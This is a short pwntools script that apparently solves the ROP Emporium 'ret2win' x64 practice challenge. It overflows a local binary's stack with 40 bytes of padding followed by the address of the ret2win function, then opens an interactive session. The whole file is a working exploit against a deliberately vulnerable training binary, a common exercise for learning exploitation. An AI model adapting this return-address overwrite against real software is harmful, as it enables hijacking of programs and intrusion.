from pwn import * 

bin= '/home/kali/Downloads/ropemporium/challenge1/x64/ret2win'
bin= ELF(bin)
context.binary= bin
context.log_level='info'

offset= 40

ret2win= bin.symbols['ret2win']

payload= flat(b'A'* offset, ret2win)

p=process(bin.path)
p.send(payload)
p.interactive()